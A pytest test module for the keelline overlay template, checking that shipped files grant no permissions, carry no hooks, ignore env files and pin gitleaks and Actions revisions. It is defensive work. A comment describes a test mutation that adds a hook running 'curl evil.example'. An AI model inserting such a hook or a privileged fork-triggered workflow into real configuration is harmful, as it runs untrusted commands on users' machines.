from __future__ import annotations

import json
import re
from pathlib import Path

import pytest

from keelline import __version__
from keelline.config.loader import preset_defaults
from keelline.hooks.api import EVENTS
from keelline.overlay.layout import OVERLAY_FILES, PLACEHOLDER_NAMES
from keelline.overlay.template import template_root, templates
from keelline.presets import load_preset
from keelline.scaffold import MANIFEST_PATH


def _json_files() -> list[Path]:
    return sorted(template_root().rglob("*.json"))


def test_the_template_tree_is_reachable_at_all() -> None:
    # The non-vacuity guard, and it is not hypothetical: `rglob` over a directory that is not
    # in the wheel or the sdist returns nothing, and every assertion below then passes by
    # finding no files to fail on. `tests/test_import_boundary.py` carries the same idiom for
    # the same reason.
    assert template_root().is_dir()
    assert _json_files(), "no JSON in templates/overlay — the invariants below are vacuous"


def test_the_template_ships_no_allow_rule_anywhere() -> None:
    # §12: "Overlay template shipping `allow` rules or hooks → a test over templates/overlay/
    # fails the release." The plugin author may never grant a permission (§3, first row); only
    # the machine owner may, by editing their own instance after it is theirs.
    for path in _json_files():
        assert "allow" not in _keys(json.loads(path.read_text(encoding="utf-8"))), path


def test_the_template_ships_no_hook_entry() -> None:
    # Same row. An overlay hook is the machine owner's to add; one shipped in the template
    # would execute on every machine that created an instance from it.
    #
    # The `if "hooks" in payload` guard this replaced was the defect: a file with no `hooks`
    # key was not examined at all, so a hook written under a bare top-level event key —
    # `{"PreToolUse": [...]}`, the shape `.codex/hooks.json` uses — passed. Both spellings are
    # refused now, and the event vocabulary comes from `hooks.api.EVENTS` rather than a second
    # copy of it here, so a sixth event is covered the day it is declared.
    #
    # Mutation: put `{"PreToolUse": [{"matcher": "Bash", "hooks": [{"type": "command",
    # "command": "curl evil.example"}]}]}` into common/claude/hooks.json -> reddens.
    for path in _json_files():
        payload = json.loads(path.read_text(encoding="utf-8"))
        assert payload.get("hooks", {}) == {}, path
        assert not set(EVENTS) & _keys(payload), path


def test_the_preset_grants_nothing_anywhere_in_it() -> None:
    # The same rule for the other shipped file that can carry permissions. An earlier draft
    # asserted `"allow" not in preset["deny"]` — an allow key nested INSIDE the deny table,
    # which nobody writes. §3 forbids an allow rule anywhere in anything the author ships.
    assert "allow" not in _keys(load_preset("recommended"))


def test_the_template_ignores_env_files() -> None:
    # §6.4: the overlay may hold hostnames, user ids and env-file paths; it never holds
    # credentials. This is the cheap half of that promise; gitleaks is the other half.
    #
    # The patterns, from the non-comment lines, and not `".env" in text`: that substring test
    # was satisfied by the word appearing in the file's own explanatory comment, so commenting
    # every pattern out left it green with nothing ignored at all.
    #
    # Mutation: comment out the `.env` line in templates/overlay/.gitignore -> reddens.
    text = (template_root() / ".gitignore").read_text(encoding="utf-8")
    patterns = {
        stripped for line in text.splitlines() if (stripped := line.strip()) and stripped[0] != "#"
    }
    assert patterns, "an all-comment .gitignore ignores nothing"
    assert {".env", ".env.*"} <= patterns, patterns


# A `rev:` a pre-commit hook may carry: an immutable release tag, or a full commit sha. A
# branch name is neither, and a branch is the whole of what this row exists to refuse.
_PINNED_REV = re.compile(r"\Av\d+\.\d+\.\d+\Z|\A[0-9a-f]{40}\Z")


def test_the_template_pins_gitleaks_at_a_revision() -> None:
    # GitHub does not scan private repositories on a personal plan, so gitleaks is the scan.
    # An unpinned rev is a third party choosing what runs on the owner's machine.
    #
    # The *value* of `rev:`, and not `"rev:" in config`: that membership test is true of every
    # possible pre-commit configuration, including one pinned at `main`, which is exactly the
    # state it is named for refusing.
    #
    # Mutation: `mutations.toml`'s "the overlay template follows gitleaks' default branch".
    config = (template_root() / ".pre-commit-config.yaml").read_text(encoding="utf-8")
    assert "gitleaks" in config
    revisions = re.findall(r"^\s*rev:\s*(\S+)\s*$", config, re.MULTILINE)
    assert revisions, "no `rev:` at all, so the hook follows whatever the repo's default branch is"
    for revision in revisions:
        assert _PINNED_REV.match(revision), revision


def test_the_template_ships_permissions_that_are_neither_granted_nor_pretended() -> None:
    # This file used to ship `deny: ["Read(.env*)", "Read(**/.env*)"]`, asserted here by value
    # and called "the template's only actual protection". It was not protection at all:
    # `attach.permissions._allow_rules` reads `permissions.allow` and nothing else, so no deny
    # rule in this file has ever reached a bound repository, a harness, or any other reader in
    # the tree. Meanwhile `presets/recommended.toml`'s `[deny] global` — which `setup` merges
    # into `<home>/.claude/settings.json`, where it does fire for every project on the machine —
    # had grown a third rule this copy never got. A dead duplicate, one rule behind the live
    # one, documented as live.
    #
    # So the rules went, and the assertion moved to where they fire:
    # `tests/setup/test_machine.py::test_the_preset_denies_reading_env_files_by_value` and
    # `tests/setup/test_setup.py::test_setup_writes_the_machine_file_and_the_deny_rules`.
    # What is left here is the shape: a `permissions` table with no rule of any kind in it.
    #
    # Mutation: `mutations.toml`'s "the overlay template starts granting a permission".
    payload = json.loads(
        (template_root() / "common" / "claude" / "permissions.json").read_text(encoding="utf-8")
    )
    # `.get` and an explicit `{} ==`, not `[...]`: a mutation that emptied the whole file would
    # otherwise raise `KeyError`, and a crash is a worse proof than an assertion.
    assert payload.get("permissions") == {}, payload


# A write permission, in every spelling a workflow can grant one. `write-all` is the one that
# matters most and the one the first draft of this test missed: `permissions: write-all` on a
# *job* grants every scope while a top-level `permissions: contents: read` sits above it looking
# correct, which is the same escalation shape with the top-level assertion intact.
_WRITE_SCOPE = re.compile(r"^\s*[a-z-]+:\s*write(-all)?\s*$", re.MULTILINE)
# A pinned action: `owner/repo@<40 hex>`, with the release it is in a trailing comment. D16: a
# full-length commit sha is the only immutable reference GitHub Actions has. The comment's shape
# is this repository's own convention, taken from `.github/workflows/`, where every `uses:` is
# already pinned this way -- the overlay template was the one place it was not. `v7`, `v6.0.0` and
# everything between are all spellings that convention uses, so all three are accepted: a test
# that rejected the house style would be a trap for whoever next bumps a pin.
_PINNED_USES = re.compile(r"\A[\w.-]+/[\w.-]+@[0-9a-f]{40} # v\d+(\.\d+){0,2}\Z")


def _scan_workflow() -> str:
    return (template_root() / ".github" / "workflows" / "scan.yml").read_text(encoding="utf-8")


def _block(text: str, key: str) -> list[str]:
    """The two-space-indented keys directly under the top-level `key:`, and nothing else.

    A regex over the whole file was the first draft and it was wrong in the way that matters:
    `^  ([a-z_]+):` matches every two-space-indented key anywhere, so `triggers` also held
    `contents` and `gitleaks` -- and the non-vacuity guard below would then have passed with the
    whole `on:` block deleted. Stdlib-only, so this is a reader and not `yaml.safe_load`.
    """
    lines = text.splitlines()
    if f"{key}:" not in lines:
        return []
    found: list[str] = []
    for line in lines[lines.index(f"{key}:") + 1 :]:
        if line and not line.startswith(" "):
            break
        if (match := re.match(r"^  ([A-Za-z_][\w-]*):", line)) is not None:
            found.append(match.group(1))
    return found


def test_the_scan_workflow_never_runs_a_forks_head_with_the_repositorys_own_token() -> None:
    # Nothing asserted anything about this file before -- the reviewer rewrote it to
    # `pull_request_target:` with `contents: write` and `id-token: write` and all 43 cases
    # passed. Both halves are asserted: the trigger that makes a fork's code privileged, and
    # any write scope, because `contents: read` alone is what a secret scan needs.
    #
    # Mutations: `mutations.toml`'s "the overlay's secret scan runs a fork's head" and "the
    # overlay's secret scan is given a write token".
    text = _scan_workflow()
    triggers = _block(text, "on")
    assert triggers, "no `on:` block was found, so the assertion below measures nothing"
    assert "pull_request_target" not in triggers, triggers
    assert re.search(r"^permissions:\n  contents: read\n", text, re.MULTILINE), text
    assert _WRITE_SCOPE.search(text) is None, _WRITE_SCOPE.search(text)


def test_the_scan_workflow_pins_every_action_at_an_immutable_revision() -> None:
    # Finding 23, and the same argument the `rev:` case above makes one directory over: a tag is
    # a name its owner can move. `actions/checkout@v4` and `gitleaks/gitleaks-action@v2` were
    # mutable major tags in a file that runs with `secrets.GITHUB_TOKEN` over a repository
    # holding the owner's rules and notes -- while the sibling `.pre-commit-config.yaml` argued
    # at length that an unpinned revision "lets somebody else choose what runs on your machine".
    # D16: a full-length commit sha is the only immutable reference Actions has.
    #
    # Mutation: `mutations.toml`'s "the overlay's secret scan follows a moveable action tag".
    steps = [
        stripped.removeprefix("- uses:").strip()
        for line in _scan_workflow().splitlines()
        if (stripped := line.strip()).startswith("- uses:")
    ]
    assert len(steps) == 2, steps
    for step in steps:
        assert _PINNED_USES.match(step), step


@pytest.mark.parametrize("relative", sorted(OVERLAY_FILES))
def test_every_declared_file_exists(relative: str) -> None:
    # The list and the tree are two statements of one thing, and they drift. Asserting from the
    # list catches a deleted file; the next test catches an undeclared one.
    assert (template_root() / relative).is_file()


def test_no_file_in_the_tree_is_undeclared() -> None:
    root = template_root()
    present = {str(p.relative_to(root)) for p in root.rglob("*") if p.is_file()}
    assert present == set(OVERLAY_FILES)


def test_the_templates_plan_cleanly_into_an_empty_directory(tmp_path: Path) -> None:
    from keelline.scaffold import apply, plan

    # The overlay writes through C2 like every other lane, which is what makes `overlay
    # upgrade` the engine's hash-and-skip rule rather than a second implementation of it.
    planned = plan(tmp_path, preset_defaults("keelline-private"), templates())
    assert planned.refusals == ()
    assert len(planned.actions) == len(OVERLAY_FILES)
    apply(tmp_path, planned)
    assert (tmp_path / ".keelline" / "manifest.json").is_file()


def test_the_manifest_records_a_comparable_version(tmp_path: Path) -> None:
    from keelline.scaffold import Manifest, apply, plan

    # `[defaults.keelline]` carries no `version`, and the engine stamps one into every Record.
    # A record written with "" is a record `upgrade` and `doctor` can never compare against.
    apply(tmp_path, plan(tmp_path, preset_defaults("keelline-private"), templates()))
    records = Manifest.read(tmp_path).records
    assert records and {record.version for record in records.values()} == {__version__}


def _keys(value: object) -> set[str]:
    """Every key anywhere in a parsed JSON/TOML document.

    Recursive on purpose: the risk §3 names is an allow rule *anywhere* in a shipped file, and
    a top-level membership test misses `permissions.allow`, which is where one would actually
    be written.
    """
    if isinstance(value, dict):
        return set(value) | {key for item in value.values() for key in _keys(item)}
    if isinstance(value, list):
        return {key for item in value for key in _keys(item)}
    return set()


# --- the README that counts the files, checked against the files ------------------------------

# The words this document could plausibly spell a file count with. Local rather than imported
# from `tests/test_documents.py`, whose map stops at twelve for its own ten-principle sentence.
_COUNT_WORDS = {
    "twelve": 12,
    "thirteen": 13,
    "fourteen": 14,
    "fifteen": 15,
    "sixteen": 16,
    "seventeen": 17,
    "eighteen": 18,
    "nineteen": 19,
    "twenty": 20,
}
_STATED_COUNT = re.compile(r"renders (\w+) files here")


def _rendered_paths() -> tuple[str, ...]:
    """Every file `overlay create` leaves in a fresh instance, as the README has to describe it.

    `OVERLAY_FILES` plus the scaffold manifest, which is the one path the template tree does not
    hold: `scaffold.apply` writes `.keelline/manifest.json` as the record `overlay upgrade` keys
    on, so it is in the instance without ever having been in `templates/overlay/`. That is
    exactly how it went missing from a README that counts them.
    """
    return (*OVERLAY_FILES, str(MANIFEST_PATH))


def test_the_overlay_readme_counts_the_files_a_create_actually_leaves() -> None:
    # The template README said "renders fifteen files here" and a rendered overlay has sixteen —
    # `.keelline/manifest.json`, the file the project README advertises as the overlay's "own
    # upgrade manifest", in neither of that README's two tables. The count was written by hand
    # against `OVERLAY_FILES` and nothing read the document, which is how a file the scaffold
    # engine adds slips past a sentence that counts them.
    #
    # Mutation: `mutations.toml`'s "the overlay README stops counting the manifest".
    expected = _rendered_paths()
    assert expected, "no overlay files at all — every assertion below is vacuous"
    text = (template_root() / "README.md").read_text(encoding="utf-8")
    stated = _STATED_COUNT.search(text)
    assert stated is not None, "the overlay README no longer says how many files a create leaves"
    assert _COUNT_WORDS[stated.group(1).lower()] == len(expected), stated.group(1)


def test_the_capability_files_are_spelled_once_and_are_shipped_files() -> None:
    # S1: the comment beside `CAPABILITY_FILES` said the two names were "not spelled twice"
    # while the tuple was built by filtering `OVERLAY_FILES` against a second spelling of
    # them. One spelling now: `CAPABILITY_NAMES` is unpacked into `OVERLAY_FILES` and
    # `CAPABILITY_FILES` is that same tuple.
    from keelline.overlay.layout import CAPABILITY_FILES, CAPABILITY_NAMES, OVERLAY_FILES

    # Against the SHIPPED tree, not against `OVERLAY_FILES`: with one spelling the subset
    # holds by construction, so the assertion that can fail is that each name is a file the
    # template actually carries. Mutation: rename one entry of `CAPABILITY_NAMES` to
    # `common/claude/allow.json` -> it is no longer under `template_root()` and this reddens.
    # The count by value, first and on its own. The derived form this replaced could not be
    # emptied without emptying `OVERLAY_FILES` too; one spelling removed that guard, and
    # `CAPABILITY_NAMES = ()` satisfies the alias comparison, the subset (`OVERLAY_FILES`
    # unpacks the tuple) and the loop below, while silently emptying `overlay upgrade`'s
    # decision list — the one list §6.1 diffs "regardless of hash".
    assert len(CAPABILITY_NAMES) == 2, CAPABILITY_NAMES
    assert CAPABILITY_FILES == CAPABILITY_NAMES
    assert set(CAPABILITY_NAMES) <= set(OVERLAY_FILES)
    for relative in CAPABILITY_NAMES:
        assert (template_root() / relative).is_file(), relative


def _is_placeholder(relative: str) -> bool:
    """Whether this path is a directory's own documentation rather than a file in its own right.

    `overlay create` drops a `README.md` into each directory the owner fills — `common/rules/`,
    `common/memory/`, `projects/` — and a `SKILL.md` under `skills/`. The template README
    describes those as *directories* on purpose, and naming four placeholders inside them would
    be noise. Derived from the basename rather than listed, so a fourth such directory needs no
    edit here. The convention is stated in `layout.py`, beside `PLACEHOLDER_NAMES`, which is
    also where the sentence about the root `README.md` now lives; the `/` conjunct below is
    what excludes it.
    """
    return "/" in relative and relative.rsplit("/", 1)[1] in PLACEHOLDER_NAMES


def test_the_overlay_readme_accounts_for_every_file_a_create_leaves() -> None:
    # The count is only half of it: fifteen rows and a sixteenth file is caught above, but so is
    # sixteen rows describing the wrong sixteen files, and only this half says which.
    #
    # **A file is accounted for by its full path**, and an ancestor directory is accepted only
    # for a placeholder. The first draft of this accepted any ancestor, and the declared mutation
    # that renames `hooks/hooks.json` in the README *survived* it — `hooks/` was still there and
    # stood in for the file. That is the one pair this document exists to tell apart, because
    # `hooks/hooks.json` and `common/claude/hooks.json` are both `{"hooks": {}}` and nothing but
    # this README says which fires where. An accounting rule that cannot see that rename is not
    # an accounting rule.
    #
    # Mutation: `mutations.toml`'s "the overlay README stops naming the hooks file".
    text = (template_root() / "README.md").read_text(encoding="utf-8")
    assert text.strip(), "an empty README accounts for nothing"
    missing = []
    for relative in _rendered_paths():
        if _is_placeholder(relative):
            directory = f"{relative.rsplit('/', 1)[0].split('/')[0]}/"
            names = [relative, f"{relative.rsplit('/', 1)[0]}/", directory]
        else:
            names = [relative]
        if not any(name in text for name in names):
            missing.append(relative)
    assert missing == [], missing
